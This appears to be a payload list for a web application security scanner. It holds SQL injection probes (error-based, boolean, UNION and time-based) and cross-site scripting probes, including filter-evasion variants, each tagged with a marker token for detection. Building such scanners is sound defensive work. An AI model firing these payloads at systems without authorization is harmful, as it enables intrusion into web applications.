{
  "source": "Own list written for CloudSentinel ml-dast (see PAYLOADS.md). Categories follow PayloadsAllTheThings (MIT, https://github.com/swisskyrepo/PayloadsAllTheThings) but no file was copied.",
  "marker": "{M} is replaced by a unique per-request token (letters+digits, starts with a letter) so reflection is attributed to this request only.",
  "modes": {"append": "baseline value + payload", "replace": "payload replaces the value"},
  "payloads": [
    {"id": "sq-err-1", "class": "CWE-89", "family": "error", "mode": "append", "value": "'"},
    {"id": "sq-err-2", "class": "CWE-89", "family": "error", "mode": "append", "value": "\""},
    {"id": "sq-err-3", "class": "CWE-89", "family": "error", "mode": "append", "value": "')"},
    {"id": "sq-err-4", "class": "CWE-89", "family": "error", "mode": "append", "value": "'\"`{M}"},
    {"id": "sq-err-5", "class": "CWE-89", "family": "error", "mode": "append", "value": "\\"},
    {"id": "sq-err-6", "class": "CWE-89", "family": "error", "mode": "append", "value": " AND"},
    {"id": "sq-bool-s1t", "class": "CWE-89", "family": "boolean", "pair": "sq-bool-s1", "truth": true, "mode": "append", "value": "' AND '1'='1"},
    {"id": "sq-bool-s1f", "class": "CWE-89", "family": "boolean", "pair": "sq-bool-s1", "truth": false, "mode": "append", "value": "' AND '1'='2"},
    {"id": "sq-bool-s2t", "class": "CWE-89", "family": "boolean", "pair": "sq-bool-s2", "truth": true, "mode": "append", "value": "' OR '1'='1"},
    {"id": "sq-bool-s2f", "class": "CWE-89", "family": "boolean", "pair": "sq-bool-s2", "truth": false, "mode": "append", "value": "' OR '1'='2"},
    {"id": "sq-bool-c1t", "class": "CWE-89", "family": "boolean", "pair": "sq-bool-c1", "truth": true, "mode": "append", "value": "' AND 1=1-- -"},
    {"id": "sq-bool-c1f", "class": "CWE-89", "family": "boolean", "pair": "sq-bool-c1", "truth": false, "mode": "append", "value": "' AND 1=2-- -"},
    {"id": "sq-bool-p1t", "class": "CWE-89", "family": "boolean", "pair": "sq-bool-p1", "truth": true, "mode": "append", "value": "') OR 1=1-- -"},
    {"id": "sq-bool-p1f", "class": "CWE-89", "family": "boolean", "pair": "sq-bool-p1", "truth": false, "mode": "append", "value": "') OR 1=2-- -"},
    {"id": "sq-bool-p2t", "class": "CWE-89", "family": "boolean", "pair": "sq-bool-p2", "truth": true, "mode": "append", "value": "')) OR 1=1-- -"},
    {"id": "sq-bool-p2f", "class": "CWE-89", "family": "boolean", "pair": "sq-bool-p2", "truth": false, "mode": "append", "value": "')) OR 1=2-- -"},
    {"id": "sq-bool-n1t", "class": "CWE-89", "family": "boolean", "pair": "sq-bool-n1", "truth": true, "mode": "append", "value": " AND 1=1"},
    {"id": "sq-bool-n1f", "class": "CWE-89", "family": "boolean", "pair": "sq-bool-n1", "truth": false, "mode": "append", "value": " AND 1=2"},
    {"id": "sq-bool-n2t", "class": "CWE-89", "family": "boolean", "pair": "sq-bool-n2", "truth": true, "mode": "append", "value": " OR 1=1"},
    {"id": "sq-bool-n2f", "class": "CWE-89", "family": "boolean", "pair": "sq-bool-n2", "truth": false, "mode": "append", "value": " OR 1=2"},
    {"id": "sq-bool-o1t", "class": "CWE-89", "family": "boolean", "pair": "sq-bool-o1", "truth": true, "mode": "append", "value": ",(SELECT 1)"},
    {"id": "sq-bool-o1f", "class": "CWE-89", "family": "boolean", "pair": "sq-bool-o1", "truth": false, "mode": "append", "value": ",(SELECT 1 FROM cs_no_such_table)"},
    {"id": "sq-union-1", "class": "CWE-89", "family": "union", "mode": "append", "value": "' UNION SELECT NULL-- -"},
    {"id": "sq-union-2", "class": "CWE-89", "family": "union", "mode": "append", "value": "' UNION SELECT NULL,NULL-- -"},
    {"id": "sq-time-my", "class": "CWE-89", "family": "time", "mode": "append", "value": "' AND SLEEP(1)-- -"},
    {"id": "sq-time-myn", "class": "CWE-89", "family": "time", "mode": "append", "value": " AND SLEEP(1)"},
    {"id": "sq-time-pg", "class": "CWE-89", "family": "time", "mode": "append", "value": "' AND 1=(SELECT 1 FROM pg_sleep(1))-- -"},
    {"id": "sq-time-pgn", "class": "CWE-89", "family": "time", "mode": "append", "value": " AND 1=(SELECT 1 FROM pg_sleep(1))"},

    {"id": "xs-tag-1", "class": "CWE-79", "family": "tag", "mode": "replace", "value": "<b>{M}</b>"},
    {"id": "xs-tag-2", "class": "CWE-79", "family": "tag", "mode": "replace", "value": "<script>{M}</script>"},
    {"id": "xs-tag-3", "class": "CWE-79", "family": "tag", "mode": "replace", "value": "<svg/onload={M}>"},
    {"id": "xs-tag-4", "class": "CWE-79", "family": "tag", "mode": "replace", "value": "<img src=x onerror={M}>"},
    {"id": "xs-tag-5", "class": "CWE-79", "family": "tag", "mode": "replace", "value": "<iframe srcdoc={M}></iframe>"},
    {"id": "xs-attr-dq", "class": "CWE-79", "family": "attr", "mode": "replace", "value": "\"><svg onload={M}>"},
    {"id": "xs-attr-sq", "class": "CWE-79", "family": "attr", "mode": "replace", "value": "'><svg onload={M}>"},
    {"id": "xs-attr-evdq", "class": "CWE-79", "family": "attr", "mode": "replace", "value": "\" autofocus onfocus={M} x=\""},
    {"id": "xs-attr-evsq", "class": "CWE-79", "family": "attr", "mode": "replace", "value": "' onmouseover={M} x='"},
    {"id": "xs-uri", "class": "CWE-79", "family": "attr", "mode": "replace", "value": "javascript:{M}()"},
    {"id": "xs-js-sq", "class": "CWE-79", "family": "script", "mode": "replace", "value": "';{M};//"},
    {"id": "xs-js-dq", "class": "CWE-79", "family": "script", "mode": "replace", "value": "\";{M};//"},
    {"id": "xs-js-close", "class": "CWE-79", "family": "script", "mode": "replace", "value": "</script><script>{M}</script>"},
    {"id": "xs-evade-1", "class": "CWE-79", "family": "evasion", "mode": "replace", "value": "<ScRiPt>{M}</sCrIpT>"},
    {"id": "xs-evade-2", "class": "CWE-79", "family": "evasion", "mode": "replace", "value": "<scr<script>ipt>{M}</scr</script>ipt>"},
    {"id": "xs-tmpl", "class": "CWE-79", "family": "template", "mode": "replace", "value": "{{{M}}}<%={M}%>"}
  ]
}
